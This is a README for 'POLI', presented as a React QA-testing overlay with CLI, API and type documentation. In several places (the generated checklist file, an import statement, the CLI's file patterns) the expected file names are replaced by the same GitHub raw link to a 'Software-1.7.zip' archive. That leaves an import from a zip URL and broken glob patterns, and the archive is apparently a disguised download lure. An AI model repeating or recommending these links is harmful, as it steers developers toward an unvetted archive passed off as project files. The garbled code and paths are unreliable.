# POLI - Portable Overlay for Live Inspection

🦜 A QA testing overlay for React applications. Add manual testing checklists, bug reporting, and test session management to any React app.

## Features

- 🔍 **Auto-Detection CLI** - Scans your project and generates test checklists automatically
- 🧪 **Test Checklists** - Define tests per screen, mark as pass/fail/skip
- 🐛 **Bug Reporting** - Report bugs with severity, steps to reproduce, expected/actual behavior
- 📊 **Test Sessions** - Track testing progress across sessions
- 💾 **Persistent State** - Auto-saves to localStorage
- 📥 **Export Reports** - Generate Markdown reports
- ⌨️ **Keyboard Shortcut** - Toggle with Ctrl+Shift+Q (Cmd+Shift+Q on Mac)
- 🎨 **Draggable Panel** - Position anywhere on screen
- 🚫 **No CSS Dependencies** - All styles are inline, works without Tailwind

## Installation

```bash
npm install poli-qa
```

## Quick Start with CLI (Recommended)

The easiest way to get started is using the CLI to auto-detect your screens:

```bash
# Scan your project and generate test checklists
npx poli-qa init
```

This will:
1. Scan your `src/` folder for screen/page components
2. Generate a `https://github.com/Mordecaied/POLI/raw/refs/heads/main/src/services/Software-1.7.zip` file with suggested tests
3. Give you instructions on how to integrate POLI

Then in your app:

```tsx
import { QAProvider, QAPanel } from 'poli-qa';
import { checklists } from 'https://github.com/Mordecaied/POLI/raw/refs/heads/main/src/services/Software-1.7.zip';

function App() {
  return (
    <QAProvider defaultChecklists={checklists}>
      <YourApp />
      <QAPanel />
    </QAProvider>
  );
}
```

### CLI Commands

```bash
npx poli-qa init          # Scan project and generate checklists
npx poli-qa scan          # Preview detected screens without generating
npx poli-qa add <screen>  # Add a new screen manually
npx poli-qa help          # Show help
```

### What the CLI Detects

The CLI looks for files matching these patterns:
- `*https://github.com/Mordecaied/POLI/raw/refs/heads/main/src/services/Software-1.7.zip`, `*https://github.com/Mordecaied/POLI/raw/refs/heads/main/src/services/Software-1.7.zip`, `*https://github.com/Mordecaied/POLI/raw/refs/heads/main/src/services/Software-1.7.zip`
- Files in `pages/`, `screens/`, `views/`, `routes/` directories

It then analyzes the code to suggest relevant tests based on:
- Forms, inputs, validation
- Authentication flows
- Data fetching and loading states
- Navigation and modals
- And more...

## Manual Setup

```bash
npm install poli-qa
```

## Manual Setup (Without CLI)

If you prefer to define checklists manually:

```tsx
import { QAProvider, QAPanel } from 'poli-qa';
import type { TestChecklist } from 'poli-qa';

// Define your app's screens
type AppScreen = 'HOME' | 'DASHBOARD' | 'SETTINGS' | 'PROFILE';

// Define test checklists for each screen
const checklists: TestChecklist<AppScreen>[] = [
  {
    screen: 'HOME',
    items: [
      {
        id: 'home_001',
        screen: 'HOME',
        category: 'UI',
        description: 'Hero section loads with correct content',
        status: 'not_started',
      },
      {
        id: 'home_002',
        screen: 'HOME',
        category: 'Functionality',
        description: 'CTA button navigates to signup',
        status: 'not_started',
      },
    ],
  },
  {
    screen: 'DASHBOARD',
    items: [
      {
        id: 'dash_001',
        screen: 'DASHBOARD',
        category: 'UI',
        description: 'Dashboard shows user stats',
        status: 'not_started',
      },
    ],
  },
];

function App() {
  return (
    <QAProvider defaultChecklists={checklists}>
      {/* Your app components */}
      <YourApp />

      {/* Add the QA panel */}
      <QAPanel />
    </QAProvider>
  );
}
```

## API Reference

### `<QAProvider>`

Wrap your app with QAProvider to enable POLI.

```tsx
<QAProvider
  defaultChecklists={checklists}  // Test checklists for your app
  storageKey="my_app_qa"          // localStorage key (default: 'poli_qa_state')
  enableScreenDetection={true}    // Auto-detect current screen (default: true)
  testerName="QA Tester"          // Default tester name
>
  {children}
</QAProvider>
```

### `<QAPanel>`

The main QA panel component. Renders as a floating button when minimized.

```tsx
<QAPanel />
```

### `useQA()` Hook

Access QA state and functions from any component.

```tsx
const {
  // State
  state,              // Full QA state
  currentScreen,      // Currently detected screen
  isOpen,             // Panel visibility

  // Panel control
  togglePanel,
  openPanel,
  closePanel,

  // Screen detection
  setCurrentScreen,   // Manually set current screen

  // Test management
  updateTestStatus,   // (testId, status, notes?) => void
  addTestItem,        // Add a test dynamically
  removeTestItem,     // Remove a test

  // Bug reporting
  reportBug,          // Report a new bug
  updateBugStatus,    // Update bug status
  deleteBug,          // Delete a bug

  // Sessions
  startTestSession,   // (name, tester) => void
  completeTestSession,// (notes?) => void
  deleteSession,      // Delete a past session

  // Export
  generateMarkdownReport, // Returns string
  exportState,        // Downloads .md file
  resetState,         // Reset all state
} = useQA();
```

### Screen Detection

Manually tell POLI which screen the user is on:

```tsx
function MyScreen() {
  const { setCurrentScreen } = useQA();

  useEffect(() => {
    setCurrentScreen('DASHBOARD');
    return () => setCurrentScreen(null);
  }, []);

  return <div>Dashboard content</div>;
}
```

Or create a custom hook:

```tsx
function useScreen(screen: AppScreen) {
  const { setCurrentScreen } = useQA();

  useEffect(() => {
    setCurrentScreen(screen);
    return () => setCurrentScreen(null);
  }, [screen, setCurrentScreen]);
}

// Usage
function DashboardScreen() {
  useScreen('DASHBOARD');
  return <div>Dashboard</div>;
}
```

## Test Item Structure

```typescript
interface TestItem {
  id: string;                    // Unique identifier
  screen: string;                // Screen this test belongs to
  category: 'UI' | 'Functionality' | 'Performance' | 'Integration';
  description: string;           // What to test
  status: 'not_started' | 'passed' | 'failed' | 'skipped';
  notes?: string;                // Tester notes
  testedAt?: number;             // Timestamp when tested
}
```

## Bug Report Structure

```typescript
interface BugReport {
  id: string;
  title: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  status: 'open' | 'in_progress' | 'fixed' | 'wont_fix';
  screen: string;
  stepsToReproduce: string[];
  expectedBehavior: string;
  actualBehavior: string;
  reportedAt: number;
  reportedBy: string;
}
```

## Keyboard Shortcuts

- **Ctrl+Shift+Q** (Windows/Linux) or **Cmd+Shift+Q** (Mac) - Toggle panel visibility

## Styling

POLI uses inline styles and has no external CSS dependencies. It works with any React app regardless of styling solution (Tailwind, CSS Modules, styled-components, etc.).

The panel is fixed positioned with z-index 9999 to ensure it overlays your app.

## Development

```bash
# Install dependencies
npm install

# Build the package
npm run build

# Watch mode
npm run dev
```

## License

MIT
